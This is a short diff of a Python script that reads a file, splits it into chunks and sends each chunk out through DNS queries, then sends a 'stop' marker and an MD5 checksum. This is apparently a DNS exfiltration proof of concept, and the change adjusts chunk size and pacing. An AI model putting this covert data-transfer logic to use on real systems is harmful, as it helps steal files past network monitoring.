@@ -10,11 +10,12 @@ def query(msg):
     except dns.resolver.NoAnswer:
         pass
 
-string = file2string('test.txt')
-msg = string2msg(string, n=30)
+string = file2string('test.txt') 
+msg = string2msg(string, n=60)
 for _ in msg:
     print(f"[+] Sending: {_}")
-    query(_)
+    query(_)  
+    # sleep(0.1)
 query('stop')
 md5 = file2md5('test.txt')
 print(f"[+] MD5: {md5}")
